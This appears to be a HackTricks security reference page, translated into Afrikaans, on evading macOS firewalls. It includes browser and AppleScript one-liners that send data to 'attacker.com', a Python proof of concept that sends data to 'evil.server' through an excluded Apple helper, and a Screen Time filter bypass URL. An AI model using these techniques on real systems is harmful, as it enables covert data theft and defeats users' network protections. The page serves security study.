# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Gevonde tegnieke

Die volgende tegnieke is gevind wat werk in sommige macOS firewall toepassings.

### Misbruik van witlys name

- Byvoorbeeld, noem die malware met name van bekende macOS prosesse soos **`launchd`**

### Sintetiese Klik

- As die firewall toestemming van die gebruiker vra, laat die malware **klik op toelaat**

### **Gebruik Apple onderteken binêre**

- Soos **`curl`**, maar ook ander soos **`whois`**

### Bekende apple domeine

Die firewall mag verbindinge na bekende apple domeine soos **`apple.com`** of **`icloud.com`** toelaat. En iCloud kan as 'n C2 gebruik word.

### Generiese Bypass

Sommige idees om te probeer om firewalls te omseil

### Kontroleer toegelate verkeer

Om die toegelate verkeer te ken, sal jou help om potensieel gewhitelist domeine of watter toepassings toegelaat word om toegang tot hulle te verkry te identifiseer.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Misbruik van DNS

DNS-oplossings word gedoen via **`mdnsreponder`** onderteken toepassing wat waarskynlik toegelaat sal word om DNS-bedieners te kontak.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Deur Blaaier toepassings

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Deur prosesinjekties

As jy **kode in 'n proses kan inspuit** wat toegelaat word om met enige bediener te verbind, kan jy die firewall beskerming omseil:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Onlangs macOS firewall omseil kwesbaarhede (2023-2025)

### Webinhoudfilter (Screen Time) omseiling – **CVE-2024-44206**
In Julie 2024 het Apple 'n kritieke fout in Safari/WebKit reggestel wat die stelselswye “Webinhoudfilter” wat deur Screen Time ouerbeheer gebruik word, gebroke het.
'n Spesiaal saamgestelde URI (byvoorbeeld, met dubbele URL-gecodeerde “://”) word nie deur die Screen Time ACL erken nie, maar word deur WebKit aanvaar, sodat die versoek ongefilter gestuur word. Enige proses wat 'n URL kan oopmaak (insluitend sandboxed of ongetekende kode) kan dus domeine bereik wat eksplisiet deur die gebruiker of 'n MDM-profiel geblokkeer is.

Praktiese toets (nie reggestelde stelsel):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) reël-volgorde fout in vroeë macOS 14 “Sonoma”
Tydens die macOS 14 beta siklus het Apple 'n regressie in die gebruikersruimte-wrapper rondom **`pfctl`** bekendgestel. Reëls wat met die `quick` sleutelwoord (gebruik deur baie VPN kill-switches) bygevoeg is, is stilweg geïgnoreer, wat verkeer lekkasies veroorsaak het selfs wanneer 'n VPN/firewall GUI *gebloek* gerapporteer het. Die fout is deur verskeie VPN verskaffers bevestig en in RC 2 (bou 23A344) reggestel. 

Quick leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Misbruik van Apple-ondertekende helperdienste (erf – voor macOS 11.2)
Voor macOS 11.2 het **`ContentFilterExclusionList`** toegelaat ~50 Apple binêre soos **`nsurlsessiond`** en die App Store om alle socket-filter vuurmure wat met die Network Extension-raamwerk geïmplementeer is (LuLu, Little Snitch, ens.) te omseil. 
Kwaadaardige sagteware kon eenvoudig 'n uitgeslote proses laat ontstaan—of kode daarin inspuit—en sy eie verkeer oor die reeds-toegelate socket tonnel. Apple het die uitsluitingslys heeltemal verwyder in macOS 11.2, maar die tegniek is steeds relevant op stelsels wat nie opgegradeer kan word nie.

Voorbeeld bewys-van-konsep (voor-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Gereedskapwenke vir moderne macOS

1. Ondersoek huidige PF-reëls wat GUI-firewalls genereer:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumereer binaire wat reeds die *uitgaande-netwerk* regte het (nuttig vir piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programmaties registreer jou eie Netwerkuitbreiding inhoudsfilter in Objective-C/Swift.
'n Minimale rootless PoC wat pakkette na 'n plaaslike soket stuur, is beskikbaar in Patrick Wardle se **LuLu** bronnkode.

## Verwysings

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
